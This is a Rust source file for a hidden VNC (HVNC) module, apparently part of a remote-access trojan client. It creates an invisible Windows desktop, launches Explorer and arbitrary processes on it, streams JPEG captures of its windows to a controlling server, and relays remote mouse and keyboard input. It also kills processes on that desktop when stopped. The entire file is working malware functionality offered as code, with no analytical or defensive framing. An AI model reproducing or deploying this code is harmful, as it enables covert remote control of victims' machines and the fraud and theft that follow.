use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use std::sync::Mutex;
use std::io::Cursor;
use std::ffi::CString;
use std::ptr::null_mut;
use std::mem::zeroed;

use winapi::um::winuser::*;
use winapi::um::wingdi::*;
use winapi::shared::windef::*;
use winapi::shared::minwindef::*;
use winapi::um::processthreadsapi::*;
use winapi::um::winnt::GENERIC_ALL;
use winapi::um::handleapi::CloseHandle;
use winapi::um::tlhelp32::*;

use common::packets::{ServerboundPacket, HVNCFrame, HVNCConfig, MouseClickData, KeyboardInputData};
use crate::handler::send_packet;

use tokio::sync::mpsc;
use once_cell::sync::Lazy;

static ACCESS_FLAGS: DWORD = DESKTOP_CREATEWINDOW | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP | DESKTOP_ENUMERATE | GENERIC_ALL;

static HVNC_ACTIVE: Mutex<Option<Arc<AtomicBool>>> = Mutex::new(None);
static DESKTOP_NAME: Mutex<String> = Mutex::new(String::new());

enum HVNCInput {
    Mouse(MouseClickData),
    Keyboard(KeyboardInputData),
    StartProcess(String),
}

static INPUT_TX: Lazy<Mutex<Option<mpsc::UnboundedSender<HVNCInput>>>> = Lazy::new(|| Mutex::new(None));

pub fn start_hvnc(config: HVNCConfig) {
    stop_hvnc();

    let stop_flag = Arc::new(AtomicBool::new(false));
    *HVNC_ACTIVE.lock().unwrap() = Some(Arc::clone(&stop_flag));
    
    let desktop_name = format!("HVNC_{}", rand::random::<u32>());
    *DESKTOP_NAME.lock().unwrap() = desktop_name.clone();

    let (tx, mut rx) = mpsc::unbounded_channel::<HVNCInput>();
    *INPUT_TX.lock().unwrap() = Some(tx);
    
    thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("Failed to create Tokio runtime");
            
        let desktop_name_cstr = CString::new(desktop_name.clone()).unwrap();
        
        let hvnc_desktop = unsafe {
            let h = CreateDesktopA(
                desktop_name_cstr.as_ptr(),
                null_mut(),
                null_mut(),
                0,
                ACCESS_FLAGS,
                null_mut()
            );
            if h.is_null() {
                OpenDesktopA(desktop_name_cstr.as_ptr(), 0, FALSE, ACCESS_FLAGS)
            } else {
                h
            }
        };
        
        if hvnc_desktop.is_null() {
            return;
        }
        
        unsafe {
            SetThreadDesktop(hvnc_desktop);
        }

        // Start explorer on the new desktop
        open_process_internal(&desktop_name, "explorer.exe");
        
        let frame_delay = Duration::from_millis(1000 / config.fps.max(1) as u64);
        let stop_flag_clone = Arc::clone(&stop_flag);
        let desktop_name_clone = desktop_name.clone();

        // Input handling loop on the desktop thread
        thread::spawn(move || {
            unsafe {
                let d_cstr = CString::new(desktop_name_clone).unwrap();
                let h_d = OpenDesktopA(d_cstr.as_ptr(), 0, FALSE, ACCESS_FLAGS);
                if h_d.is_null() { return; }
                SetThreadDesktop(h_d);

                while !stop_flag_clone.load(Ordering::Relaxed) {
                    if let Ok(input) = rx.try_recv() {
                        match input {
                            HVNCInput::Mouse(data) => {
                                let hwnd = WindowFromPoint(POINT { x: data.x, y: data.y });
                                if !hwnd.is_null() {
                                    let mut screen_point = POINT { x: data.x, y: data.y };
                                    ScreenToClient(hwnd, &mut screen_point);
                                    let lparam = ((screen_point.y as u32) << 16) | (screen_point.x as u32 & 0xFFFF);
                                    match (data.click_type, data.action_type) {
                                        (0, 1) => { PostMessageA(hwnd, WM_LBUTTONDOWN, MK_LBUTTON as usize, lparam as isize); },
                                        (0, 2) => { PostMessageA(hwnd, WM_LBUTTONUP, 0, lparam as isize); },
                                        (2, 1) => { PostMessageA(hwnd, WM_RBUTTONDOWN, MK_RBUTTON as usize, lparam as isize); },
                                        (2, 2) => { PostMessageA(hwnd, WM_RBUTTONUP, 0, lparam as isize); },
                                        (_, 3) => { PostMessageA(hwnd, WM_MOUSEMOVE, 0, lparam as isize); },
                                        _ => {}
                                    }
                                }
                            },
                            HVNCInput::Keyboard(data) => {
                                let hwnd = GetForegroundWindow();
                                if !hwnd.is_null() {
                                    let msg = if data.is_keydown { WM_KEYDOWN } else { WM_KEYUP };
                                    PostMessageA(hwnd, msg, data.key_code as usize, 0);
                                    if data.is_keydown && !data.character.is_empty() {
                                        for c in data.character.chars() {
                                            PostMessageA(hwnd, WM_CHAR, c as usize, 0);
                                        }
                                    }
                                }
                            },
                            HVNCInput::StartProcess(path) => {
                                open_process_internal(&desktop_name_clone, &path);
                            }
                        }
                    }
                    thread::sleep(Duration::from_millis(10));
                }
                CloseDesktop(h_d);
            }
        });

        while !stop_flag.load(Ordering::Relaxed) {
            let start_time = std::time::Instant::now();
            
            if let Some(frame) = capture_hvnc_desktop(hvnc_desktop, config.quality) {
                let packet = ServerboundPacket::HVNCFrame(frame);
                let _ = rt.block_on(send_packet(packet));
            }
            
            let elapsed = start_time.elapsed();
            if elapsed < frame_delay {
                thread::sleep(frame_delay - elapsed);
            }
        }
        
        unsafe {
            kill_all_processes_on_desktop(&desktop_name);
            CloseDesktop(hvnc_desktop);
        }
    });
}

pub fn stop_hvnc() {
    if let Some(flag) = HVNC_ACTIVE.lock().unwrap().take() {
        flag.store(true, Ordering::Relaxed);
    }
    *INPUT_TX.lock().unwrap() = None;
}

pub fn hvnc_start_process(process_path: String) {
    if let Some(tx) = INPUT_TX.lock().unwrap().as_ref() {
        let _ = tx.send(HVNCInput::StartProcess(process_path));
    }
}

fn open_process_internal(desktop_name: &str, process_path: &str) {
    unsafe {
        let mut si: STARTUPINFOA = zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let desktop_cstr = CString::new(format!("WinSta0\\{}", desktop_name)).unwrap();
        si.lpDesktop = desktop_cstr.as_ptr() as *mut i8;
        
        let mut pi: PROCESS_INFORMATION = zeroed();
        let cmd = CString::new(process_path).unwrap();
        let mut cmd_vec: Vec<i8> = cmd.as_bytes_with_nul().iter().map(|&b| b as i8).collect();

        CreateProcessA(
            null_mut(),
            cmd_vec.as_mut_ptr(),
            null_mut(),
            null_mut(),
            FALSE,
            0,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi
        );
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

fn capture_hvnc_desktop(h_desktop: HDESK, quality: u8) -> Option<HVNCFrame> {
    unsafe {
        let h_old_desktop = GetThreadDesktop(GetCurrentThreadId());
        SetThreadDesktop(h_desktop);
        
        let h_dc_screen = GetDC(null_mut());
        let h_dc_mem = CreateCompatibleDC(h_dc_screen);
        
        let width = GetDeviceCaps(h_dc_screen, HORZRES);
        let height = GetDeviceCaps(h_dc_screen, VERTRES);

        let h_bitmap = CreateCompatibleBitmap(h_dc_screen, width, height);
        let h_old_obj = SelectObject(h_dc_mem, h_bitmap as HGDIOBJ);

        // Fill background with black
        let brush = CreateSolidBrush(0);
        let rect = RECT { left: 0, top: 0, right: width, bottom: height };
        FillRect(h_dc_mem, &rect, brush);
        DeleteObject(brush as HGDIOBJ);

        unsafe extern "system" fn enum_windows_proc(hwnd: HWND, lparam: LPARAM) -> BOOL {
            if IsWindowVisible(hwnd) != 0 {
                let h_dc_mem = lparam as HDC;
                // PW_RENDERFULLCONTENT = 2
                PrintWindow(hwnd, h_dc_mem, 2);
            }
            TRUE
        }

        EnumDesktopWindows(h_desktop, Some(enum_windows_proc), h_dc_mem as LPARAM);
        
        let mut bmi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: -height,
                biPlanes: 1,
                biBitCount: 24,
                biCompression: BI_RGB,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }; 1],
        };

        let row_stride = ((width * 24 + 31) / 32) * 4;
        let mut buffer = vec![0u8; (row_stride * height) as usize];
        GetDIBits(
            h_dc_mem,
            h_bitmap,
            0,
            height as u32,
            buffer.as_mut_ptr() as *mut _,
            &mut bmi,
            DIB_RGB_COLORS,
        );

        SelectObject(h_dc_mem, h_old_obj);
        DeleteObject(h_bitmap as HGDIOBJ);
        DeleteDC(h_dc_mem);
        ReleaseDC(null_mut(), h_dc_screen);

        SetThreadDesktop(h_old_desktop);

        // Convert BGR to RGB, handling stride
        let mut rgb_data = Vec::with_capacity((width * height * 3) as usize);
        for y in 0..height {
            let row_start = (y * row_stride) as usize;
            for x in 0..width {
                let pixel_start = row_start + (x * 3) as usize;
                rgb_data.push(buffer[pixel_start + 2]);
                rgb_data.push(buffer[pixel_start + 1]);
                rgb_data.push(buffer[pixel_start]);
            }
        }

        let img = image::RgbImage::from_raw(width as u32, height as u32, rgb_data)?;
        let mut jpeg_bytes = Cursor::new(Vec::new());
        img.write_to(&mut jpeg_bytes, image::ImageOutputFormat::Jpeg(quality)).ok()?;

        Some(HVNCFrame {
            data: jpeg_bytes.into_inner(),
            width: width as u32,
            height: height as u32,
        })
    }
}

pub fn hvnc_mouse_click(data: MouseClickData) {
    if let Some(tx) = INPUT_TX.lock().unwrap().as_ref() {
        let _ = tx.send(HVNCInput::Mouse(data));
    }
}

pub fn hvnc_keyboard_input(data: KeyboardInputData) {
    if let Some(tx) = INPUT_TX.lock().unwrap().as_ref() {
        let _ = tx.send(HVNCInput::Keyboard(data));
    }
}

unsafe fn kill_all_processes_on_desktop(desktop_name: &str) {
    let desktop_cstr = CString::new(desktop_name).unwrap();
    let h_desktop = OpenDesktopA(desktop_cstr.as_ptr(), 0, FALSE, DESKTOP_ENUMERATE);
    if h_desktop.is_null() { return; }

    let mut pids: Vec<DWORD> = Vec::new();

    unsafe extern "system" fn enum_proc(hwnd: HWND, lparam: LPARAM) -> BOOL {
        let pids = &mut *(lparam as *mut Vec<DWORD>);
        let mut pid: DWORD = 0;
        GetWindowThreadProcessId(hwnd, &mut pid);
        if pid != 0 && !pids.contains(&pid) {
            pids.push(pid);
        }
        TRUE
    }

    EnumDesktopWindows(h_desktop, Some(enum_proc), &mut pids as *mut _ as LPARAM);

    for pid in pids {
        if pid != GetCurrentProcessId() {
            let h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if !h_process.is_null() {
                TerminateProcess(h_process, 0);
                CloseHandle(h_process);
            }
        }
    }

    CloseDesktop(h_desktop);
}
